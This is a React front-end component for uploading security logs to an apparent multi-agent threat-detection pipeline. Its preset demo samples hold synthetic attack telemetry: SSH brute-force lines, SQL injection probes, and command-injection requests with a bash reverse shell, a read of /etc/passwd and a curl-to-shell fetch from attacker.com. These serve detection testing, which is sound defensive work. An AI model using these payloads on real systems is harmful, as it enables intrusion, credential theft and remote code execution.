import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../../services/api';
import Button from '../common/Button';
import Badge from '../common/Badge';
import {
  UploadCloud,
  FileCode,
  CheckCircle2,
  AlertTriangle,
  ShieldAlert,
  ShieldCheck,
  Eye,
  EyeOff,
  X,
  Sparkles,
  RefreshCw,
  ExternalLink,
  Zap,
  Activity,
  ArrowRight,
} from 'lucide-react';
import './LogUploader.css';

// Preset test log telemetry for rapid SOC demonstrations
const PRESET_SAMPLES = [
  {
    id: 'ssh_brute_force',
    label: 'SSH Brute Force',
    icon: '🔥',
    filename: 'auth_ssh_attack.log',
    content: `Jun 14 03:12:01 server sshd[12431]: Failed password for invalid user admin from 192.168.1.105 port 42112 ssh2
Jun 14 03:12:03 server sshd[12435]: Failed password for invalid user root from 192.168.1.105 port 42118 ssh2
Jun 14 03:12:06 server sshd[12439]: Failed password for invalid user test from 192.168.1.105 port 42124 ssh2
Jun 14 03:12:09 server sshd[12442]: Failed password for invalid user oracle from 192.168.1.105 port 42130 ssh2
Jun 14 03:12:12 server sshd[12446]: Failed password for invalid user deploy from 192.168.1.105 port 42136 ssh2
Jun 14 03:12:15 server sshd[12450]: Failed password for invalid user postgres from 192.168.1.105 port 42142 ssh2
Jun 14 03:12:18 server sshd[12455]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.105`,
  },
  {
    id: 'sqli_vector',
    label: 'SQL Injection',
    icon: '💉',
    filename: 'access_sqli_probe.log',
    content: `10.0.0.45 - - [14/Jun/2026:08:14:22 +0000] "GET /api/users?id=1%27%20OR%201=1-- HTTP/1.1" 200 4521
10.0.0.45 - - [14/Jun/2026:08:14:25 +0000] "GET /api/products?cat=electronics%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 500 1204
10.0.0.45 - - [14/Jun/2026:08:14:28 +0000] "POST /api/login HTTP/1.1" 200 892 "admin'--"
10.0.0.45 - - [14/Jun/2026:08:14:31 +0000] "GET /api/search?q=test%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1" 200 342`,
  },
  {
    id: 'cmd_injection',
    label: 'Command Injection',
    icon: '⚡',
    filename: 'web_rce_exploit.log',
    content: `172.16.4.88 - - [14/Jun/2026:11:02:15 +0000] "POST /cgi-bin/test.sh HTTP/1.1" 200 234 "; /bin/bash -c 'bash -i >& /dev/tcp/172.16.4.88/4444 0>&1'"
172.16.4.88 - - [14/Jun/2026:11:02:18 +0000] "GET /admin/ping?host=127.0.0.1%7Ccat%20/etc/passwd HTTP/1.1" 200 1489
172.16.4.88 - - [14/Jun/2026:11:02:22 +0000] "GET /utility/check?target=localhost;curl%20http://attacker.com/mal.sh|sh HTTP/1.1" 200 512`,
  },
  {
    id: 'clean_baseline',
    label: 'Clean Web Telemetry',
    icon: '🛡️',
    filename: 'normal_web_traffic.log',
    content: `192.168.0.12 - - [14/Jun/2026:14:20:10 +0000] "GET /assets/index.js HTTP/1.1" 200 48291 "https://corp.local/" "Mozilla/5.0"
192.168.0.12 - - [14/Jun/2026:14:20:11 +0000] "GET /api/v1/health HTTP/1.1" 200 45 "https://corp.local/" "Mozilla/5.0"
192.168.0.15 - - [14/Jun/2026:14:20:15 +0000] "GET /dashboard HTTP/1.1" 200 14201 "https://corp.local/" "Mozilla/5.0"
192.168.0.22 - - [14/Jun/2026:14:20:19 +0000] "POST /api/v1/settings HTTP/1.1" 200 182 "https://corp.local/" "Mozilla/5.0"`,
  },
];

const PIPELINE_STAGES = [
  { id: 1, name: 'LogParserAgent', desc: 'Normalizing tokens' },
  { id: 2, name: 'ThreatClassifierAgent', desc: 'Evaluating heuristics' },
  { id: 3, name: 'ThreatIntelligenceAgent', desc: 'Mapping MITRE ATT&CK' },
  { id: 4, name: 'RemediationAgent', desc: 'Synthesizing guidance' },
];

const LogUploader = ({ onUploadSuccess }) => {
  const navigate = useNavigate();
  const fileInputRef = useRef(null);

  const [selectedFile, setSelectedFile] = useState(null);
  const [filePreview, setFilePreview] = useState('');
  const [showPreview, setShowPreview] = useState(false);
  const [isDragging, setIsDragging] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [activeStage, setActiveStage] = useState(0);
  const [uploadError, setUploadError] = useState(null);
  const [analysisResult, setAnalysisResult] = useState(null);

  const formatFileSize = (bytes) => {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
  };

  const handleFileProcess = (file) => {
    if (!file) return;

    // Validate extension
    const allowed = ['.log', '.txt', '.csv', '.json'];
    const ext = '.' + file.name.split('.').pop().toLowerCase();
    if (!allowed.includes(ext)) {
      setUploadError(`Invalid file format "${ext}". Only .log, .txt, .csv, and .json files are supported.`);
      return;
    }

    // Validate size (15MB)
    if (file.size > 15 * 1024 * 1024) {
      setUploadError('File size exceeds the 15MB maximum limit.');
      return;
    }

    setUploadError(null);
    setAnalysisResult(null);
    setSelectedFile(file);

    // Read preview of first ~20 lines
    const reader = new FileReader();
    reader.onload = (e) => {
      const text = e.target?.result || '';
      const lines = text.split('\n').slice(0, 15).join('\n');
      setFilePreview(lines);
    };
    reader.readAsText(file);
  };

  const handleDragOver = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(true);
  };

  const handleDragLeave = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(false);
  };

  const handleDrop = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleFileProcess(e.dataTransfer.files[0]);
    }
  };

  const handleFileSelect = (e) => {
    if (e.target.files && e.target.files[0]) {
      handleFileProcess(e.target.files[0]);
    }
  };

  const loadPreset = (preset) => {
    const blob = new Blob([preset.content], { type: 'text/plain' });
    const file = new File([blob], preset.filename, { type: 'text/plain' });
    handleFileProcess(file);
  };

  const handleClearSelection = () => {
    setSelectedFile(null);
    setFilePreview('');
    setShowPreview(false);
    setUploadError(null);
    setAnalysisResult(null);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  const handleUploadAndAnalyze = async () => {
    if (!selectedFile) return;

    setUploading(true);
    setUploadError(null);
    setActiveStage(1);

    // Multi-agent stage progression animation
    const stageInterval = setInterval(() => {
      setActiveStage((prev) => (prev < 4 ? prev + 1 : prev));
    }, 600);

    const formData = new FormData();
    formData.append('logFile', selectedFile);

    try {
      const response = await api.post('/logs/upload', formData, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      });

      clearInterval(stageInterval);
      setActiveStage(4);

      if (response.data && response.data.success) {
        setAnalysisResult(response.data);
        if (onUploadSuccess) {
          onUploadSuccess(response.data);
        }
      } else {
        throw new Error(response.data?.message || 'Ingestion completed with non-success response.');
      }
    } catch (err) {
      clearInterval(stageInterval);
      console.error('Log upload failure:', err);
      setUploadError(
        err.response?.data?.message || err.message || 'Failed to ingest and analyze log file.'
      );
    } finally {
      setUploading(false);
    }
  };

  return (
    <div className="log-uploader-card">
      {/* Component Header */}
      <div className="log-uploader-header">
        <div className="log-uploader-title-group">
          <span className="log-uploader-eyebrow">
            <Zap size={13} />
            MULTI-AGENT TELEMETRY PIPELINE
          </span>
          <h2 className="log-uploader-title">Ingest & Analyze Security Event Logs</h2>
          <p className="log-uploader-subtitle">
            Ingest raw server access logs, auth records, or security telemetry. 4 autonomous agents will normalize,
            classify threats, correlate MITRE techniques, and formulate response guidance.
          </p>
        </div>
      </div>

      {/* Preset Quick-Test Buttons */}
      <div className="log-presets-bar">
        <span className="log-presets-label">
          <Sparkles size={13} style={{ color: '#0284C7' }} />
          Rapid Test Presets:
        </span>
        {PRESET_SAMPLES.map((preset) => (
          <button
            key={preset.id}
            type="button"
            className="log-preset-btn"
            onClick={() => loadPreset(preset)}
            disabled={uploading}
            title={`Load ${preset.filename}`}
          >
            <span>{preset.icon}</span>
            <span>{preset.label}</span>
          </button>
        ))}
      </div>

      {/* Dropzone Container */}
      {!selectedFile && (
        <div
          className={`log-dropzone ${isDragging ? 'is-dragging' : ''}`}
          onDragOver={handleDragOver}
          onDragLeave={handleDragLeave}
          onDrop={handleDrop}
          onClick={() => fileInputRef.current?.click()}
        >
          <input
            ref={fileInputRef}
            type="file"
            accept=".log,.txt,.csv,.json"
            style={{ display: 'none' }}
            onChange={handleFileSelect}
          />
          <div className="log-dropzone-icon-wrap">
            <UploadCloud size={28} />
          </div>
          <div>
            <div className="log-dropzone-title">Click to browse or drop your security log file here</div>
            <div className="log-dropzone-desc">Supports standard Linux Syslog, Apache/Nginx access logs, JSON & CSV</div>
          </div>
          <div className="log-dropzone-specs">
            <span className="log-format-chip">.LOG</span>
            <span className="log-format-chip">.TXT</span>
            <span className="log-format-chip">.CSV</span>
            <span className="log-format-chip">.JSON</span>
            <span style={{ fontSize: '11.5px', color: 'var(--text-muted)' }}>Max 15MB</span>
          </div>
        </div>
      )}

      {/* Selected File Card */}
      {selectedFile && (
        <div className="log-selected-card">
          <div className="log-selected-header">
            <div className="log-selected-info">
              <div className="log-file-icon">
                <FileCode size={22} />
              </div>
              <div className="log-file-meta">
                <span className="log-file-name">{selectedFile.name}</span>
                <span className="log-file-submeta">
                  <span>{formatFileSize(selectedFile.size)}</span>
                  <span>•</span>
                  <span>{selectedFile.type || 'Plaintext / Log'}</span>
                </span>
              </div>
            </div>

            <div className="log-selected-actions">
              {filePreview && (
                <Button
                  type="button"
                  variant="outline"
                  size="sm"
                  onClick={() => setShowPreview(!showPreview)}
                  leftIcon={showPreview ? <EyeOff size={13} /> : <Eye size={13} />}
                >
                  {showPreview ? 'Hide Snippet' : 'Preview Telemetry'}
                </Button>
              )}

              <Button
                type="button"
                variant="ghost"
                size="sm"
                onClick={handleClearSelection}
                disabled={uploading}
                leftIcon={<X size={14} />}
              >
                Clear
              </Button>

              <Button
                type="button"
                variant="primary"
                size="sm"
                onClick={handleUploadAndAnalyze}
                isLoading={uploading}
                leftIcon={<Zap size={14} />}
              >
                {uploading ? 'Analyzing Telemetry...' : 'Execute Multi-Agent Analysis'}
              </Button>
            </div>
          </div>

          {/* Telemetry Preview Snippet */}
          {showPreview && filePreview && (
            <div className="log-preview-box">
              <pre>{filePreview}</pre>
            </div>
          )}
        </div>
      )}

      {/* Pipeline Stepper During Upload */}
      {uploading && (
        <div className="log-pipeline-progress">
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <span style={{ fontSize: '12.5px', fontWeight: 700, color: 'var(--accent-primary)', display: 'flex', alignItems: 'center', gap: 6 }}>
              <Activity size={14} className="aegis-btn-spinner" />
              Multi-Agent Analysis Pipeline in Progress...
            </span>
            <span style={{ fontSize: '11.5px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
              Stage {activeStage} of 4
            </span>
          </div>
          <div className="log-pipeline-steps">
            {PIPELINE_STAGES.map((step) => {
              const isDone = activeStage > step.id;
              const isCurrent = activeStage === step.id;
              return (
                <div
                  key={step.id}
                  className={`log-pipeline-step ${isCurrent ? 'active' : ''} ${isDone ? 'completed' : ''}`}
                >
                  {isDone ? (
                    <CheckCircle2 size={14} style={{ color: '#16A34A', flexShrink: 0 }} />
                  ) : isCurrent ? (
                    <RefreshCw size={13} className="aegis-btn-spinner" style={{ color: '#0284C7', flexShrink: 0 }} />
                  ) : (
                    <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#CBD5E1', flexShrink: 0 }} />
                  )}
                  <div style={{ display: 'flex', flexDirection: 'column' }}>
                    <span style={{ fontSize: '11.5px', fontWeight: 700 }}>{step.name}</span>
                    <span style={{ fontSize: '10.5px', opacity: 0.8 }}>{step.desc}</span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Upload Error Banner */}
      {uploadError && (
        <div
          style={{
            background: 'var(--status-critical-bg)',
            border: '1px solid var(--status-critical-border)',
            borderRadius: 'var(--radius-md)',
            padding: '12px 16px',
            color: '#DC2626',
            fontSize: '13px',
            display: 'flex',
            alignItems: 'center',
            gap: '10px',
            marginTop: '16px',
          }}
        >
          <AlertTriangle size={16} style={{ flexShrink: 0 }} />
          <div style={{ flex: 1 }}>{uploadError}</div>
          <button
            onClick={() => setUploadError(null)}
            style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#DC2626' }}
          >
            <X size={14} />
          </button>
        </div>
      )}

      {/* Analysis Result Banner */}
      {analysisResult && (
        <div
          className={`log-result-banner ${
            analysisResult.threat
              ? analysisResult.threat.severity === 'Critical'
                ? 'log-result-threat critical'
                : 'log-result-threat'
              : 'log-result-clean'
          }`}
        >
          <div className="log-result-top">
            <div className="log-result-status-group">
              <div className="log-result-status-icon">
                {analysisResult.threat ? <ShieldAlert size={24} /> : <ShieldCheck size={24} />}
              </div>
              <div>
                <div className="log-result-title">
                  {analysisResult.threat
                    ? `Security Threat Identified: ${analysisResult.threat.threatType}`
                    : 'Log Telemetry Verified Clean: No Threats Detected'}
                </div>
                <div className="log-result-desc">
                  {analysisResult.threat?.description ||
                    'Log file processed cleanly. Zero anomalous command executions, injection payloads, or brute-force patterns identified.'}
                </div>
              </div>
            </div>

            {analysisResult.threat && (
              <Badge
                variant={
                  analysisResult.threat.severity === 'Critical'
                    ? 'critical'
                    : analysisResult.threat.severity === 'High'
                    ? 'high'
                    : analysisResult.threat.severity === 'Medium'
                    ? 'medium'
                    : 'low'
                }
              >
                {analysisResult.threat.severity} Severity
              </Badge>
            )}
          </div>

          {/* Telemetry Metric Cards */}
          {analysisResult.threat && (
            <div className="log-result-metrics">
              <div className="log-metric-item">
                <span className="log-metric-label">MITRE Technique</span>
                <span className="log-metric-val">{analysisResult.threat.mitreTechnique || 'T1059'}</span>
              </div>
              <div className="log-metric-item">
                <span className="log-metric-label">Confidence Rating</span>
                <span className="log-metric-val" style={{ color: '#0284C7' }}>
                  {analysisResult.threat.confidence}% Calculated
                </span>
              </div>
              {analysisResult.threat.sourceIp && (
                <div className="log-metric-item">
                  <span className="log-metric-label">Attacker Origin IP</span>
                  <span className="log-metric-val" style={{ fontFamily: 'var(--font-mono)' }}>
                    {analysisResult.threat.sourceIp}
                  </span>
                </div>
              )}
              {analysisResult.incident && (
                <div className="log-metric-item">
                  <span className="log-metric-label">Incident Dispatched</span>
                  <span className="log-metric-val" style={{ color: '#DC2626' }}>
                    {analysisResult.incident.incidentId || 'Triaged'}
                  </span>
                </div>
              )}
            </div>
          )}

          {/* Recommendation & Actions */}
          {analysisResult.threat?.recommendation && (
            <div
              style={{
                fontSize: '12.5px',
                color: 'var(--text-secondary)',
                background: 'rgba(255, 255, 255, 0.7)',
                padding: '10px 14px',
                borderRadius: 'var(--radius-md)',
                border: '1px solid rgba(0, 0, 0, 0.05)',
              }}
            >
              <strong style={{ color: 'var(--text-primary)' }}>Remediation Action: </strong>
              {analysisResult.threat.recommendation}
            </div>
          )}

          <div className="log-result-actions">
            {analysisResult.threat && (
              <Button
                type="button"
                variant="primary"
                size="sm"
                onClick={() => navigate('/threats')}
                rightIcon={<ArrowRight size={13} />}
              >
                Inspect in Threat Forensics
              </Button>
            )}

            {analysisResult.incident && (
              <Button
                type="button"
                variant="outline"
                size="sm"
                onClick={() => navigate('/incidents')}
                rightIcon={<ExternalLink size={13} />}
              >
                View Incident Response
              </Button>
            )}

            {analysisResult.report && (
              <Button
                type="button"
                variant="outline"
                size="sm"
                onClick={() => navigate('/reports')}
                rightIcon={<ExternalLink size={13} />}
              >
                View Generated Report
              </Button>
            )}

            <Button
              type="button"
              variant="ghost"
              size="sm"
              onClick={handleClearSelection}
            >
              Upload Another Log
            </Button>
          </div>
        </div>
      )}
    </div>
  );
};

export default LogUploader;
